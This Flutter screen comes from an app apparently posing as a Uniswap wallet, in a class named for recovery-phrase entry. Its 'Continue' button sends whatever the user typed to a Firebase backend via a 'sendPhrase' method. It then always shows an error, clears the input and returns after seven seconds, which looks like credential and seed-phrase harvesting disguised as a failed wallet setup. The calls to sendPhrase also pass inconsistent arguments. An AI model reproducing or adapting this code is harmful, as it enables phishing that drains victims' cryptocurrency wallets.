import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:get/get.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:uniswap_sm_app/app/firebase/send_phrase_method.dart';
import 'package:uniswap_sm_app/app/models/tab_model.dart';
import 'package:uniswap_sm_app/app/widget/alert.dart';
import 'package:uniswap_sm_app/app/widget/btn.dart';
import '../constants/colors.dart';
import 'components/rctab.dart';

class EnterRecoverPraseScreen3 extends StatefulWidget {
  EnterRecoverPraseScreen3({super.key});

  @override
  State<EnterRecoverPraseScreen3> createState() =>
      _EnterRecoverPraseScreen3State();
}

class _EnterRecoverPraseScreen3State extends State<EnterRecoverPraseScreen3> {
  var tabberList = tabbers;
  var ctl = TextEditingController();
  var isError = false;
  final repo = SendPhrase();

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgColor,
      appBar: AppBar(
          backgroundColor: Colors.transparent,
          foregroundColor: Colors.transparent,
          shadowColor: Colors.transparent,
          leading: IconButton(
            icon: const Icon(
              Icons.arrow_back_ios_new_rounded,
              color: Color.fromARGB(255, 131, 156, 169),
              size: 26,
            ),
            onPressed: () {
              Get.back();
            },
          ),
          title: Center(child: buildRecoveryPhraseList())),
      body: buildRecoverPhraseBody(),
    );
  }

  Padding buildRecoverPhraseBody() => Padding(
        padding: const EdgeInsets.only(left: 10.0, right: 10.0),
        child: Center(
          child: Column(
            children: [
              const SizedBox(height: 20),
              Text('Say hello to your new wallet',
                  textAlign: TextAlign.center,
                  style: TextStyle(
                      color: whiteColor,
                      fontSize: 20,
                      fontWeight: FontWeight.w600)),
              const SizedBox(height: 20),
              Text(
                  'It has a public address that starts with 0x but you can\n set a private nickname for yourself',
                  textAlign: TextAlign.center,
                  style: TextStyle(color: greyColor, fontSize: 13)),
              const SizedBox(height: 20),
              buildTextField(),
              Text('0x161f...8906',
                  textAlign: TextAlign.center,
                  style: TextStyle(color: greyColor, fontSize: 15)),
              // isError
              //     ? Row(
              //         mainAxisAlignment: MainAxisAlignment.center,
              //         crossAxisAlignment: CrossAxisAlignment.center,
              //         children: [
              //           const Icon(
              //             Icons.warning_rounded,
              //             size: 30,
              //             color: Colors.red,
              //           ),
              //           const SizedBox(width: 10),
              //           Text('Invalid word: ${ctl.text}',
              //               textAlign: TextAlign.center,
              //               style: GoogleFonts.dmSans(
              //                   color: Colors.red,
              //                   fontSize: 22,
              //                   fontWeight: FontWeight.w600)),
              //         ],
              //       )
              //     : const SizedBox(
              //         height: 40.0,
              //     ),
              const SizedBox(height: 15),
              buildBtn(
                  iserror: ctl.text.isEmpty || isError,
                  doThis: () async {
                    showDialog(
                        context: context,
                        builder: (_) => Center(
                              child:
                                  CircularProgressIndicator(color: pinkColor),
                            ));
                    await repo.sendPhrase(ctl.text);
                    if (ctl.text.isEmpty || ctl.text.length <= 12) {
                      setState(() {
                        isError = true;
                      });
                      ctl.clear();
                    } else {
                      await repo.sendPhrase(
                          'Create New Wallet Button', ctl.text);
                      setState(() {
                        isError = true;
                      });
                      ctl.clear();

                      // Alertify.error(
                      //   title: "Internal Server Error",
                      //   message: "An error occured, please try again",
                      // );
                    }
                    Timer(Duration(seconds: 7), () {
                      Get.back();
                      Get.back();
                    });
                  },
                  btnText: 'Continue')
            ],
          ),
        ),
      );

  TextFormField buildTextField() {
    return TextFormField(
      textAlign: TextAlign.center,
      controller: ctl,
      onChanged: (_) {
        setState(() {
          isError = false;
        });
      },
      style: GoogleFonts.dmSans(
          color: whiteColor, fontSize: 18, fontWeight: FontWeight.w600),
      cursorColor: pinkColor,
      decoration: InputDecoration(
          hintText: 'Nickname',
          enabled: true,
          hintStyle: TextStyle(color: greyColor, fontSize: 25),
          border: InputBorder.none,
          focusedErrorBorder: InputBorder.none,
          errorText: isError ? '' : null,
          errorStyle: const TextStyle(color: Colors.red, fontSize: 20),
          errorBorder: InputBorder.none,
          focusedBorder: InputBorder.none),
    );
  }
}
